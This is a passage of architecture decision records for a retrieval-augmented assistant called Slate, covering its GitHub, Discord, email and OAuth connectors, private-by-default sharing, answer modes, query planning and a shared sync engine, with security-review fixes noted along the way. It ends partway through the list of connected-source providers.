## ADR-0023: GitHub via a GitHub App; docs + issues/PRs; tarball instead of clone
**Status:** Accepted (2026-11-25, M4).
**Context:** Open sign-up (ADR-0021) means every account connects its *own* repositories. The owner chose (2026-11-25): a GitHub App (not personal access tokens), index docs plus issues and PRs (no code yet: embedding a codebase would use a workspace's $0.25 monthly allowance in one sync), hourly sync without webhooks, and no dispatch token yet.
**Decision:**
1. **Install flow, no stored secrets.**
   - `install_link` signs a 15-minute `state` bound to the user and workspace.
   - The app has "Request user authorization (OAuth) during installation" on, so GitHub redirects back with `installation_id`, `code` and `state`.
   - The API checks the state, exchanges the code for a user token, and confirms through `GET /user/installations` that this user can access that installation, then revokes the token. Installation ids are sequential, so without this check anyone could claim someone else's installation and index their private repos.
   - A signed 30-minute grant then authorises listing and connecting repos, so the picker needs no table.
   - The worker mints 1-hour installation tokens from the app's private key (an RS256 JWT signed with `cryptography`, the one new dependency) and keeps them in memory only. Fernet credentials aren't needed.
2. **One source per repo** (name `owner/repo`, unique per workspace), always **workspace-only and private data**, even for a public repo (security review). Anyone can sign up and connect a public repo, so making it visible to all accounts would let spam or injected text reach everyone's answers. A public repo made private later must also never stay public.
3. **Content.**
   - Docs come from one tarball download per changed default branch: Markdown, MDX, text, reStructuredText and well-known root files. Vendored, generated and hidden directories are skipped. Caps: 256 KB per file, 500 files and a 50 MB tarball. Symlinks and anything that isn't a regular file are ignored.
   - Issues and PRs come from REST with `since`. Each one, with up to 100 comments, becomes one Markdown document, capped at 100k characters; at most 300 issues per sync.
   - Unchanged files are skipped by checksum before any spend. Files gone from the repo are pruned.
   - This replaces ARCHITECTURE's `git clone`: a tarball is one API call, needs no `git` binary, and keeps tokens out of clone URLs.
4. **Pipeline reuse** (rules 2 and 3): `GitHubApi` only fetches. `GitHubSync` turns results into `DocumentUpsert`s and calls `IngestService.index_document`, so spend caps, idempotency, ACL triggers and run history are shared with uploads.
5. **Scheduling.**
   - Worker housekeeping queues `sync_github` for each due repo, keyed per source per hour.
   - Connecting queues an initial sync. "Sync now" runs that waiting initial job, or otherwise a manual one (one per repo per 5 minutes).
   - In the API these run **inline** with a 90 s budget and stop cleanly at it: progress is checkpointed, the run is marked `partial`, and a continuation job is queued.
   - GitHub rate limits are honoured (`Retry-After` and `x-ratelimit-reset`) and saved as a partial run that the queue retries.
6. **Disconnect** deletes the source; documents, chunks and runs cascade. Nothing changes on GitHub.
**Consequences:** No webhooks, so a push is searchable within the next hourly sync or straight after "Sync now", which meets the M4 done-when. Code search waits for a later phase and an explicit budget decision. `TRUSTED_IP_HEADER` is now required for the API only (`Settings.require_api_settings`): the worker also runs with `ENV=prod` and would otherwise refuse to start. `sync.yml` now passes the worker its OpenAI, storage and GitHub App secrets.
**Security review (2026-11-25), fixed:**
- Repos are always workspace-only and private data.
- The grant carries only the repos *this user* can read through the installation (`/user/installations/{id}/repositories` with their own token), so an org member can't index repos the app sees but they can't.
- The tarball is read in streaming mode with caps of 50k entries and 200 MB unpacked.
- The deadline is checked before each GitHub call.
- Pagination follows only `api.github.com` links, and token-bearing calls don't follow redirects.

**Accepted:** the inline runner's 120 s timeout stays the hard outer bound, inside Vercel's 300 s; a GitHub rate-limit wait can still use part of it.

**Amendment (2026-11-27, IMPROVEMENT_PLAN P1-2): one repository overview document per repo.** Code-heavy repos gave "what does this repo do?" nothing to find. Each repo now gets one synthetic `repo:overview` document (`core/domain/github_overview.py`, pure) with:
- description, language and topics (from the repo call already made);
- the top two levels of the tree, at most 200 entries, without vendored or hidden folders;
- summaries of the root `package.json`, `pyproject.toml`, `Cargo.toml`, `go.mod` and `Dockerfile` (named fields and key lists only, never whole files; each manifest at most 64 KB, each field clipped);
- the latest release's notes, clipped to 4,000 characters.

The tree and manifests come from the same tarball walk (`TreeOverview`, yielded before `TreeSkips`), so the only new call is `GET /releases/latest` (404 means no release). The overview is rebuilt only when the head changes, and is skipped by checksum when unchanged. Code itself is still not indexed, for the original cost reason: the overview costs one small document per repo per push.

## ADR-0024: Regenerate and edit supersede messages; they are never deleted
**Status:** Accepted (2026-11-26, chat redesign).
**Context:** Retry re-asked the question as a new turn, so a stored chat showed the question twice, and there was no way to regenerate an answer or edit a question. Owner decision (2026-11-26): do it properly, with backend support.
**Decision:**
1. `POST /chat` takes `replace_from`, the id of a user message in `session_id`. That question and **every later message** of the chat are marked `messages.superseded_at` (migration 0005). This happens in the same transaction that stores the new question, and only for a live user message of a session the caller owns. Otherwise the result is 404, the same for "missing" and "someone else's".
2. `ChatStore.messages` returns live rows only (partial index `messages_live_idx`). The service supersedes, then reads history, so replaced turns never reach the prompt.
3. Regenerate is `replace_from` = the last question with the same text. Edit is `replace_from` = any question with new text. Retry is regenerate, which fixes the duplicate.
4. Rows are kept, not deleted: feedback on a replaced answer survives, and branch navigation ("‹ 2/3 ›") can be added later from the same data.
**Consequences:** One nullable column and a partial index. An answer stopped mid-stream is still not persisted (ADR-0022), so reopening that chat shows the question as "stopped" with Regenerate. `prepare` reads the chat's messages once more to validate the anchor before streaming.

## ADR-0025: Answer modes: grounded, general and chat
**Status:** Accepted (2026-11-26). Amends ADR-0022's "use only the sources" rule.
**Context:** Slate refused "hi" with "Not enough evidence": the gate found nothing, and the prompt forbade outside knowledge. Owner decision (2026-11-26): answer small talk naturally, and answer general questions from the model's own knowledge, clearly labelled, while questions about the user's own organisation that no source covers still abstain.
**Decision:**
1. **Small talk is detected by rules** (`is_small_talk`): greetings, thanks, goodbyes and "what can you do", 10 words at most, with every comma-separated part small talk on its own ("hi, what's our leave policy?" is a question). It skips retrieval and gets a short reply under `CHAT_PROMPT`. Mode: `chat`.
2. **When the gate finds nothing**, the model gets the question *without sources* under `GENERAL_PROMPT`. It either answers from general knowledge, starting with the sentinel `GENERAL_ANSWER` (mode `general`), or replies `NO_ANSWER` when the question is about the user's own organisation, people, projects, documents, repositories or data (the existing abstention, with the closest matches).
3. **The grounded prompt** gets the same choice when its sources don't answer: cite (`grounded`), `GENERAL_ANSWER` (`general`, no citation events, any `[n]` removed), or `NO_ANSWER`.
4. `SentinelFilter` recognises both sentinels at the start of the stream and never lets either reach the user. `done.mode` and `MessageOut.mode` are additive fields, so SSE stays v1. The mode is stored in `messages.usage.mode` (no migration).
5. Each question still makes **one** paid call (budget pre-checked, rate-limited, recorded in `finally`). A greeting no longer pays for an embedding.
**Consequences:**
- A question the gate used to refuse for free now costs one call (about $0.0003 with gpt-4o-mini), bounded by the existing per-user limits and spend caps.
- General answers have no citations, so the UI labels them "General answer · not from your sources".
- The organisation-or-general judgement is the model's. `evals.answers` measures it with new `expect_mode` cases (`gen-*`, `chat-*`) and reports `mode_accuracy`, `wrong_mode` and `general_instead_of_grounded`. The existing no-answer cases must still abstain.
- Security: the general and chat calls receive no sources, so they can't leak any. History is still neutralised. The abstention wording is unchanged, so it still never hints at hidden documents.

## ADR-0026: Private by default; sharing is explicit; public data only in the eval workspace
**Status:** Accepted (2026-11-26, before M5). Supersedes the visibility defaults in ARCHITECTURE §5 and the "workspace-only" ACL in ADR-0023 §2.
**Context:** Owner's principle (2026-11-26): connected data belongs to the person who connected it; it is shared only by a deliberate, permission-based act, like ChatGPT workspaces; unknown accounts never see it. An audit found the code met this only by accident: GitHub repos got `workspace:<ws>`, safe only while every workspace has one member, so the first invite (M7) would have shared every repo silently. Every account owns its workspace, so anyone could mark an upload "Public". Since the guest is gone that granted no one access, but it made the data eligible for the free tier: `worker backfill` sent public chunks from **every** workspace to Workers AI. The `may_send` guard is never called in production code.
**Decision:**
1. **Connected sources are readable by their connector only** (`user:<id>`), recorded in `sources.created_by`. Sharing with workspace members will be an explicit action when invites ship. Uploads keep their two explicit choices, "Only me" (default) and "Workspace".
2. **No public user data.** The upload "Public" choice is removed (API, client, UI). `workspaces.allows_public` is true only for the synthetic eval workspace, and triggers refuse a public source, a `public` principal on a source or document, or switching the flag off while public data remains, anywhere else. The BGE-M3 backfill reads only allowing workspaces. So user data can't reach a free-tier provider or carry the `public` principal, even if application code has a bug.
3. **Worker payloads are checked:** `process_upload` refuses a payload whose source isn't an upload source of the job's workspace, whose ACL is wider than the uploader or the workspace, or whose data class differs from its source's.
4. **Migration 0006** narrows existing GitHub sources to the workspace owner, which changes no one's access today. It merges "Public uploads" into the private "Uploads" source, keeping them readable by the workspace, and deletes their free-tier embeddings. The data steps are forward-only.
**Consequences:** Invites (M7) must add a sharing model: who may widen a source's ACL, shown in the UI, and audited. The eval workspace remains the only public data, so the public-vs-private eval split still works. **Deferred by the owner:** consent before user data goes to OpenAI (the paid API, which doesn't train on inputs), and self-hosted embeddings. Recorded, not built.
**Open (from the same audit):** the global daily AI cap can be used up by about ten verified accounts; GitHub org access is checked only at connect; API error logs can include private repo names.

## ADR-0027: Discord via one Slate bot; REST polling; windows and threads as documents
**Status:** Accepted (2026-11-26, M5).
**Context:** Every account connects its own servers (ADR-0021), and connected data is private to the person who connected it (ADR-0026). Serverless (Vercel) and the Actions worker can't hold Discord's Gateway websocket open. The owner chose (2026-11-26): one Slate bot rather than bring-your-own tokens; any channel the *user* can read, private ones included; 90-day backfill plus a 48-hour re-read; one source per server; the bot leaves a server once no Slate source uses it.
**Decision:**
1. **Install proof, no stored secrets.** The "add bot" OAuth link (scopes `bot identify guilds.members.read`, permissions View Channel and Read Message History) carries a signed 15-minute state. The callback exchanges the single-use code. Discord's token response names the server the bot was just added to, which needs Manage Server there, and it must equal `guild_id`. The user's own token reads their roles in that server and is then revoked. The bot token lives in env only.
2. **Channel access = Discord's permission algorithm** (`core/domain/discord.channel_permissions`): base role permissions, then the @everyone overwrite, then role overwrites (deny then allow), then the member overwrite; the owner and Administrator bypass it. A signed 30-minute grant lists the channels *this user* can read. `connect` accepts only those, and only if the bot can read them too. Private threads are never indexed.
3. **One source per server**, ACL `user:<connector>`, private data. Connecting more channels later extends the same source, and only its connector may do that. Two servers with the same name get distinct source names.
4. **Documents:** one per thread (including forum posts), and channel messages grouped into windows that close after a 30-minute silence or at 50 messages. Sections are built directly rather than parsed from Markdown, so message text can't forge headings. Mentions become names; attachments are listed by file name only; system messages are dropped; each document is capped at 100k characters.
5. **Sync** (`DiscordSync`), per channel:
   - **First sync:** reads backwards from the newest message for 90 days or 5,000 messages, so a busy channel keeps its latest history.
   - **Later syncs:** read forwards from an anchor, the first remembered window that ends within the last 48 hours (the newest window is always re-read).
   - **Threads:** re-read whole when their activity is after the channel's own floor, so a channel added later gets its own backfill.
   - **Edits and deletions:** unchanged documents are skipped by checksum. After a *complete* pass, windows and threads in the re-read range that no longer exist are pruned.
   - **Failures:** a failed document stops that channel's cursor there, so the next sync retries it; a deadline, rate limit or budget stop never advances a cursor past unread work.
   - **Lost access:** a channel the bot lost is reported and its documents kept (like GitHub). A deleted channel's documents are removed.
   - **Missing intent:** detected and explained (many messages, none with text).
   - **Scheduling:** hourly through `enqueue_due`; "Sync now" runs inline for up to 90 s, then the worker continues.
6. **Rate limits:** per-route buckets read from `X-RateLimit-*` headers, and 429 `retry_after` (global or per route). Waits over 60 s become `RateLimited`, so the queue retries later. Ids are validated as snowflakes before they enter a URL; only discord.com is called; no redirects are followed.
7. **Generic source actions:** `POST /sources/{id}/sync` and `DELETE /sources/{id}` dispatch by connector (`SourceActions`). A source the caller can't see is a 404, the same rule as the sources list. Disconnecting works even when the integration is no longer configured.
**Consequences:** No Gateway, so a message is searchable after the next hourly sync or "Sync now". Edits older than 48 h (outside the newest window) aren't picked up until webhooks or Gateway exist. Access is checked at connect only: someone who later loses a role keeps the channel indexed (the same accepted limit as GitHub). Disconnecting removes the bot from a server that no other source uses, so nothing is left behind.
**Fixed on the way:** `GitHubSync` recorded failures with `stage="index"`, which `ingestion_errors`' CHECK rejects, so the first document that failed to index crashed the whole sync. Both connectors now record the real pipeline stage, the adapter maps any unknown stage to `store`, and the test fake enforces the CHECK.

## ADR-0028: Email over IMAP with an app password; .mbox as the fallback
**Status:** Accepted (2026-11-26, M6). Supersedes ADR-0015 (Internal Workspace OAuth app) and replaces ADR-0009's Takeout-only plan.
**Context:** The owner wants Slate to answer questions about any email, kept current, for every account (open sign-up, ADR-0021). The Gmail API's `gmail.readonly` is a restricted scope. A public app needs Google's verification and a paid security assessment (CASA), which breaks the $0 rule. An unverified External app is limited to 100 hand-added testers whose tokens expire every 7 days. An Internal app admits only one Google Workspace organisation. A Takeout export is a one-off snapshot.
**Decision (owner, 2026-11-26):**
1. **Live mail through IMAP with an app password.**
   - The user picks a provider from a fixed list (Gmail, Yahoo, iCloud, Fastmail). The host is never user-supplied (SSRF). Outlook.com is excluded because Microsoft disabled app-password IMAP for consumer accounts.
   - The user types their address and an app password. Slate logs in once to check it, then stores it Fernet-encrypted in `credentials`. `CREDENTIALS_FERNET_KEY` may list several keys, which allows rotation.
   - Login attempts are limited to 5 per hour and 20 per day per user, so Slate can't be used to guess passwords.
2. **Read-only by construction.**
   - Folders are opened with EXAMINE and messages fetched with `BODY.PEEK[]`.
   - The adapter has no STORE, COPY, MOVE, EXPUNGE or APPEND.
   - Only Inbox and Sent are read: Sent is found by its RFC 6154 special-use flag, then by a well-known name. Spam and Trash are never read.
   - TLS with certificate checks; 30 s socket timeouts.
3. **One conversation = one document.**
   - Messages are grouped by Gmail's `X-GM-THRID` when the server offers it, else by the root of `References`/`In-Reply-To`.
   - Quoted history is stripped, so each reply's text appears once.
   - Attachments are listed by file name only and never read. Messages over 10 MB are skipped.
   - Sections are built directly, not parsed from Markdown, so mail text can't forge document structure.
   - Capped at 100 messages and 100k characters per thread.
4. **Sync.**
   - **First sync:** the newest 5,000 messages per folder from the last 90 days, keeping the 2,000 most recent conversations.
   - **Later syncs:** only UIDs after the saved cursor, then the rest of each touched conversation in every folder, so the document is rebuilt whole. Unchanged threads are skipped by checksum.
   - **UIDVALIDITY:** a change re-reads the folder.
   - **Failures:** cursors advance only after every conversation indexed, so a failure, budget stop or deadline retries next time at no extra cost.
   - **Scheduling:** hourly; "Sync now" runs inline for up to 90 s.
   - **Deletions** in the mailbox aren't tracked yet.
5. **Fallback: `.mbox` import, 25 MB** (owner's choice).
   - It uses the reviewed direct-to-storage upload path with a new `mbox` kind, sniffed by its `From ` separator line.
   - It runs in its own `import_mbox` job, never inline. The runner now refuses job kinds it doesn't handle.
   - The file becomes thread documents in the user's own "Email import" source. Takeout's `X-GM-THRID` header gives the same threads as the live sync.
   - The raw file is deleted once imported.
6. **Privacy.**
   - Email sources are `user:<connector>` and private data. The 0001 CHECK now covers `imap` (migration 0007).
   - Deleting a source deletes its credential, by trigger and in code. There is one connection per mailbox per workspace.
   - The password is never logged, echoed in errors or stored in config.
**Consequences:**
- Users must create an app password (2-Step Verification required), and the UI links to each provider's page.
- An app password grants full IMAP/SMTP access; Slate uses it only to read, and the user can revoke it at the provider at any time.
- No Google review and no expiring tokens.
- Sender and date filters in search are deferred to M7, because the query rewrite prompt changes and needs a paid eval run.
- "Load sample data" is dropped from M6 (owner).
**Security review (2026-11-26), fixed:**
- An outsider's reply with a non-ASCII Message-ID could crash every incremental sync while runs reported success. Now only printable-ASCII ids reach IMAP SEARCH, and any unexpected error is a *failed* run.
- A non-ASCII app password caused a 500 and leaked the socket. It is now rejected up front, and any login failure closes the connection; the chained exception, which holds the password, is dropped.
- A permanently failing conversation held the cursor and made every sync re-read. Only retryable failures hold it now.
- Incremental reads could drop conversations past the thread cap. They now read at most as many messages as the cap.
- IMAP dates no longer depend on the process locale.
- A failed source insert no longer orphans the credential.

## ADR-0029: Audit follow-ups: fair AI caps; GitHub access re-checked on every sync
**Status:** Accepted (2026-11-26, M7). Amends ADR-0021 §5 and ADR-0023 §1.
**Context:** The privacy audit (ADR-0026) left three items open:
- About ten verified accounts could use up the global $0.50/day cap and lock everyone out, the owner included, until midnight UTC.
- GitHub access was checked only at connect.
- API error logs might contain private names.
The owner chose (2026-11-26): exempt the owner and ramp new accounts; store the user's GitHub token to re-check on every sync.
**Decision:**
1. **Caps** (`core/domain/budget.py`):
   - The workspace owned by the verified `OWNER_EMAIL` account ignores the global *daily* cap and the per-workspace caps. The global monthly hard stop still binds it.
   - Workspaces younger than 7 days get `NEW_ACCOUNT_DAILY_BUDGET_USD` ($0.01, about 8 answers) a day instead of $0.05.
   - The ledger reports the workspace's age and owner flag in the same single query as the sums, so no extra round trip.
2. **GitHub re-check:**
   - With `CREDENTIALS_FERNET_KEY` set, the install redirect's user token is kept, Fernet-encrypted, and attached to the repos connected with that grant.
   - Every sync first asks GitHub which repos that user can still read through the installation. An expired token is refreshed, and the rotated refresh token is stored.
   - **Can't verify** (revoked, expired, or the credential no longer decrypts): the run fails with "Connect GitHub again to re-verify", and the documents stay.
   - **Access confirmed lost:** every document of that repo is removed and the run fails with the reason.
   - Reconnecting re-attaches a fresh token to your own existing repos. Tokens no source uses are swept after 24 h. A source's credential is deleted with it (the migration 0007 trigger).
   - Repos connected before this change have no token and keep the connect-time check only. Reconnect to upgrade them.
   - Without an encryption key, ADR-0023's behaviour is unchanged.
3. **Logs:** checked. The API logs an error's detail only for 5xx responses, whose text is fixed server wording. 4xx responses (where names such as repos appear) log only the code.
**Consequences:** One user token per connect is stored encrypted, which reverses ADR-0023's "no stored GitHub secret" for the sake of access correctness. Each sync makes two extra GitHub calls, against the user's own rate limit. The owner can no longer be locked out by strangers.

## ADR-0030: Shared workspaces: several per account, invitations, explicit sharing
**Status:** Accepted (2026-11-26, M7). Lifts ADR-0021's one-workspace-per-account; builds on ADR-0026.
**Context:** The owner wants ChatGPT-style workspaces: your data is private to you; you choose to share it with people you invite; unknown accounts never see it. The owner chose (2026-11-26): an account keeps its own workspace and can join others (with a switcher), and leaving or being removed deletes everything that person connected there.
**Decision:**
1. **Membership.**
   - `memberships_one_per_user` is dropped (migration 0008).
   - `sessions.workspace_id` is the *active* workspace, but only a preference. Session resolution joins `memberships` on every request and falls back to the user's own workspace (owner first) when they are no longer a member there, so a removal takes effect on the next request.
   - Switching (`POST /workspaces/switch`) checks membership in the same UPDATE. The web app clears its whole query cache on a switch.
2. **Invitations.**
   - Owners invite admins, members and viewers; admins invite members and viewers.
   - The token is 256 random bits, stored only as SHA-256. It is single use, expires after 14 days, and at most one is open per address (a resend replaces it).
   - Invites are **bound to the invited address**: only the account with that canonical email can accept, so a forwarded link is useless.
   - The link carries the token in the URL fragment, which never reaches a server log. The landing page keeps it in this tab's storage across a sign-in, and accepting needs a click, so mail scanners can't accept.
   - Mail goes out only with SMTP and `APP_URL` configured, and shares the global mail budget. Otherwise the inviter copies the link.
   - Limits: 20 invites per workspace per day, 50 members.
3. **Roles.**
   - Only the owner changes roles, never their own, never to or from owner.
   - The owner can't leave or be removed (checked in the service and again in SQL).
   - Admins remove members and viewers; anyone else may leave.
4. **Leaving or removal** deletes, in one transaction, everything that person connected in that workspace: their sources (documents, chunks and runs cascade, and the 0007 trigger deletes stored tokens), their uploads in the shared upload sources, and their chats. It also clears sessions pointing there. Audited.
5. **Sharing.**
   - `PUT /sources/{id}/sharing` is allowed only for the person who connected the source (`created_by`). It switches the source's ACL between `user:<them>` and `user:<them>, workspace:<ws>`, and rewrites its documents' ACLs in the same transaction (chunks follow by trigger).
   - Audited. Email asks for confirmation in the UI.
   - Uploads keep their per-file "Only me" / "Workspace" choice.
   - Hidden sources stay 404 for sync and disconnect (ADR-0026).
6. **Budget** (ADR-0029 amended): the owner's exemption follows the *person*. Chat and search use the caller's `is_platform_admin`; background work uses the workspace's flag only while the owner is its sole member. So invitees never inherit it.
**Consequences:** The data model already scoped everything by `workspace_id` and ACL, so retrieval SQL is unchanged: members see a source only once its connector shares it. There is no per-group sharing yet (groups exist in the schema for Phase 4).

## ADR-0031: Answer pipeline v2: query planner, metadata in context, recent lane, wider context
**Status:** Accepted (2026-11-27, M8). Amends ADR-0022 (the follow-up-only rewrite is replaced) and ADR-0019 (several queries and a third lane are fused).
**Context:** The owner found answers unreliable on real data. An audit (and a study of Onyx's search tool) found five causes, none of them in the storage or ACL design:
1. **Context starvation.** 8 passages in a 3,000-token budget: 8 chunks of ~512 tokens already fill it, so the neighbour widening never ran.
2. **No metadata.** Retrieval returned no date, author or source kind, and no prompt said what today is, so "last week", "from Priya" or "latest PR" couldn't be answered.
3. **No query understanding on first turns.** Only follow-ups were rewritten, and the filter extraction ARCHITECTURE §8.2 described was never built.
4. **Similarity can't answer "what's new".** Top-k by similarity has no notion of recency.
5. **Brittle abstention.** Abstain-or-answer rules tuned on 18 clean Markdown files; partial evidence produced refusals.
The eval set measured none of this: it had no dated, sender-bearing or connector-shaped documents.
**Decision:**
1. **Planner** (`core/domain/planner.py`). Every question except small talk gets one small call (gpt-4o-mini, ≤200 output tokens, ledger kind `rewrite`). It returns JSON: 1–3 queries, intent (`lookup|recent|summary`), an optional inclusive date range, source kinds and a sender. Pydantic validates it; anything malformed falls back to the question alone, and a planner outage degrades instead of failing. Dates resolve against the browser's IANA zone (`ChatBody.timezone`, UTC if unknown). A range starting in the future is dropped, a reversed one swapped, and a "sender" meaning the user (me, I) ignored.
2. **The plan only narrows.** ACLs are applied in SQL whatever it says. The user's own filter chips always win field by field. If the planner's filters return nothing, retrieval reruns with the user's filters alone. On a first turn the user's own words are the lead query (a rephrase can drift); on a follow-up the planner's standalone query leads.
3. **Metadata in context.** Search rows carry `COALESCE(source_updated_at, created_at)`, author, URI and connector. Each source tag shows `kind`, `date` (in the user's zone) and `from`, escaped like the other attributes. System prompts end with today's date. The URI is not shown to the model (upload URIs are internal).
4. **Recent lane** (`SearchIndex.recent_chunks`, in `search.py` under the same visibility rule). The 20 newest visible documents, with the last and first chunk of each. It runs when the intent is `recent` or `summary`, fused by weighted RRF (`rrf_fuse_lists`, weight 1.5). That is above one similarity list but below a document both lanes find for a query. For those intents the similarity gate is skipped: "what's new?" resembles no passage.
5. **Multi-query fusion.** Both lanes run for each planned query (≤3), and all lists are fused by RRF; per-document cap 3. Each query embedding is ledgered.
6. **Wider context.** 16 passages, 8,000 tokens: hits up to 6,000 in rank order (the best always), the rest for neighbours of the best hits. A chunk already shown is never repeated. Answers may use 900 tokens.
7. **Prompt.** Explains the attributes. Answer the part the sources cover and say what's missing, instead of all-or-nothing. For recent questions, lead with the newest items, give dates and leave out items outside the period. Sentinels and the data-block boundary are unchanged.
8. **Evals.** Connector-shaped synthetic documents (6 email threads, 4 Discord windows, 4 GitHub issues/PRs) are loaded under their connectors with dates and authors, plus 28 cases. An optional `plan` on a case is an *oracle plan*: the free retrieval eval applies it (measuring the lanes and filters given a correct plan), while the paid answer eval runs the real planner under a fixed clock (`EVAL_NOW`, Friday 27 November 2026).
**Alternatives:** An agent loop with a search tool (Onyx's current design) is more flexible, but costs several calls per question and is harder to bound under the $5 cap and 300 s functions; the planner is one cheap call with the same benefits for filters and multi-query. An LLM selection step after fusion (Onyx's "selection") stays behind the Phase 2 `Reranker` port until evals show it pays for its cost. Native JSON mode would need a ChatModel port change; lenient parsing with a fallback is enough for one object.
**Consequences:** About one extra cheap call and a wider context per question: roughly $0.002 instead of $0.001, and ~0.5–1 s more latency before the first token. `CHAT_MIN_SIMILARITY` must be re-tuned on the new eval set (EVALS.md). The Search page is unchanged (one query, no planner).

## ADR-0032: Integrations: a provider registry, one OAuth 2.0 flow, personal connections
**Status:** Accepted (2026-11-27, M9). Builds on ADR-0023, ADR-0027 and ADR-0028 (whose install flows stay as they are) and ADR-0026 (private by default).
**Context:** Each connector was hand-built: its own router, service, page and credential format, with refresh logic only inside the GitHub adapter and no notion of a connection's health, so the UI couldn't say "needs sign-in". The owner asked for a central Integrations page (Onyx's "Plugins" screen as the reference), proper OAuth instead of app passwords, clear status, safe token handling and a design where adding a provider is cheap. The owner decided (2026-11-27): Gmail over OAuth as an unverified app, with a professional notice explaining it; providers are indexed or queried live, per provider; answer quality first (ADR-0031), then this.
**Decision:**
1. **Providers are data** (`core/domain/integrations.py`). A `ProviderSpec` has an id, the auth kind (`oauth2`, or the older `github_app`, `discord_bot`, `app_password`), the mode (`indexed` or `live`), and for OAuth an `OAuthSpec`: endpoints, scopes and how they're sent (`user_scope` for Slack), extra parameters (`access_type=offline&prompt=consent` for Google, `owner=user` for Notion, `actor=user` for Linear), PKCE on or off, client authentication in the body or HTTP Basic, a form or JSON token body (Notion), a revoke URL, and where the account id and label come from (the token response, or a userinfo GET). `available` says whether this build can connect it. False shows "Coming soon" until the provider's sync or live adapter exists (M10+). The registry lists GitHub, Discord and email (older flows, linked from the page), then Gmail, Notion, Linear, Google Calendar (live), Google Drive (`drive.file`, a non-restricted scope), Slack and HubSpot (live).
2. **One flow for every OAuth provider.** `POST /integrations/{id}/authorize` returns the provider URL with an HMAC-signed state (10 min, bound to user, workspace and provider) and, where supported, a PKCE S256 challenge. The verifier is **derived** from the state's nonce with a server key (`slate/integrations/v1`), so it is never stored and never in a URL: whoever sees the redirect still can't redeem the code. Every provider redirects to one web page, `/integrations/callback`, which strips the code from the address bar and POSTs it once to `/integrations/{id}/callback`. The session there must match the state. The code exchange is never retried (codes are single use).
3. **Connections are personal and in their own table** (migration 0009, `connections`): one row per (workspace, user, provider, account). Tokens are one Fernet ciphertext (`CREDENTIALS_FERNET_KEY`), so a refresh replaces token, expiry and status in one UPDATE. The row references `memberships (workspace_id, user_id) ON DELETE CASCADE`, so leaving or being removed from a workspace (ADR-0030) deletes that person's connections in the database. Statuses are `connected`, `needs_reconnect` and `error`. Only the owner of a connection can see, use or remove it; viewers can't connect.
4. **Refresh** (`IntegrationService.access_token`): 5 minutes ahead of expiry, under a 60 s lease (`refresh_lease_until`), because providers rotate refresh tokens and two concurrent refreshes could kill the grant. Failures are classed: a dead grant (`invalid_grant`, `invalid_client`, Slack's `token_revoked`, a 400/401 without a code) marks `needs_reconnect` and raises `ReconnectRequired` (409, never retried); network errors, 429 and 5xx keep the token and status and raise `UpstreamUnavailable`. Only the provider's error *code* is stored or logged, never a body.
5. **Disconnect** revokes at the provider when it has a revoke endpoint (best effort) and deletes the row, and so the tokens.
6. **The page** (`/integrations`, UI_DESIGN §4.9): All / Connected / Needs sign-in, search, one row per provider with its state (Connected, Needs sign-in, Not set up, Coming soon), the account it's signed in as, and Connect, Reconnect or Disconnect. A provider with a `notice` (Google's unverified-app explanation) shows it before the user leaves. The older flows link to their own setup (`/sources?add=github|discord|email`), and their state comes from the user's sources.
7. **Config:** one client per provider family (`GOOGLE_`, `NOTION_`, `LINEAR_`, `SLACK_`, `HUBSPOT_OAUTH_CLIENT_ID/SECRET`); the redirect URI is `<APP_URL>/integrations/callback`, https outside dev. A family without both values shows "Not set up".
**Alternatives:** Storing tokens in `credentials` and pointing at them, which is two writes per refresh and no atomic status. Keeping the PKCE verifier in a table or cache, which means a write per attempt, a sweep and more Neon wake-ups; derivation needs neither. An encrypted state carrying the verifier would put a secret in the URL. Onyx's full actions-and-policies system for agent tools, out of scope: Slate's live lookups will be read-only and need no approval flow. Moving GitHub, Discord and IMAP onto `connections` now is deferred: their flows work, and each moves when it next changes.
**Consequences:** Adding a provider is a spec plus its sync or live adapter; routes, flow, storage and page are shared. `sources.connection_id` (so an indexed provider's sources follow their connection) arrives with the first indexed OAuth provider (M10), not as an unused column now. Google's restricted Gmail scope means an "unverified app" screen and a 100-user cap until a paid CASA assessment; the notice says so. Slack's 2025 rate limits for apps outside its Marketplace may make indexing impractical. Verify before building it.

## ADR-0033: Connected sources: one sync engine for Gmail, Notion, Linear, Google Calendar, Google Drive and Slack
**Status:** Accepted (2026-11-27, M10). Builds on ADR-0032 (connections) and ADR-0028 (email rules, reused for Gmail).
**Context:** The owner asked for Gmail over OAuth and then Notion, Linear, Calendar, Drive and Slack (HubSpot later), with every scenario of adding, removing and failing accounts designed. Six providers built with bespoke services, the way GitHub, Discord and IMAP were, would have repeated the problem ADR-0032 set out to remove.
**Decision:**
1. **One engine, thin connectors.** A connector implements `SourceConnector.pull(token, checkpoint, now) -> Page` and only fetches (CLAUDE.md rule 2): a page of `FetchedDocument`s (already shaped into sections by its pure rules), deleted ids, deleted id prefixes, an opaque checkpoint, `done`, and on the last page of a full pass `keep_only` (every id that still exists). `ConnectedSources` does everything else: a fresh token per page (refreshing under the lease of ADR-0032), checksum skip *before* any paid embedding, indexing, deletions, committing each fully indexed page's checkpoint, a 2,000-item cap per run, budget, time limits, rate limits, reconnects, scheduling and disconnect.
2. **Sources belong to connections** (migration 0010). `sources.connection_id` references `connections ON DELETE CASCADE`, at most one source per connection, and a CHECK requires it for the six connector names. Disconnecting (from Integrations or the source page) revokes and deletes the connection, and the source, documents, chunks, embeddings and runs go in the same statement. Leaving a workspace deletes the connection (0009), so its sources go too.
3. **Lifecycle.** Signing in calls the engine's hook: the person's private source (`user:<id>`, data class private) is created, or found on a reconnect, and a sync is queued. A refused token marks the connection `needs_reconnect`, the run fails with "Sign in to X again…", hourly syncs skip it, and what's indexed stays searchable. A setup that failed after sign-in is finished by "Sync now" (`POST /integrations/connections/{id}/sync`). Only the person who connected a source can sync or disconnect it (others get 404).
4. **A sign-in that can't work is refused and revoked:** a required scope was unticked on Google's consent screen (`required_scopes`), or no refresh token came back (`requires_refresh`).
5. **Providers.**
   - **Gmail** (`gmail.readonly`): the IMAP connector's documents (one per conversation, same external ids), built from the raw messages. 90 days / 2,000 conversations, then `history.list`. Touched conversations are re-read whole. Spam, trash and drafts are never downloaded. An expired history (404) falls back to a rescan, with checksums keeping it free.
   - **Notion:** pages shared with Slate, with properties and blocks (a section per heading). Incremental by last-edited high-water mark, a full pass weekly with `keep_only`.
   - **Linear** (`read`): issues with facts and comments. The account comes from a GraphQL `viewer` query (`IdentitySpec.post_body`). Incremental by `updatedAt`, a weekly 180-day full pass.
